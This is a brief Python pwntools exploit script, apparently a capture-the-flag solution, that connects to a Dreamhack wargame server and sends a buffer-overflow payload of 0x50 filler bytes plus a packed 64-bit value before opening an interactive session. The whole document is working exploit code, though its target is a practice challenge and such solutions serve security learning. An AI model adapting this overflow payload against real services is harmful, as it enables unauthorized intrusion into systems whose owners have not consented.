from pwn import *

p=remote("host3.dreamhack.games", 11344)

payload=b"A"*0x50
payload+=p64(1)

input()

p.sendafter(b":", payload)
p.interactive()
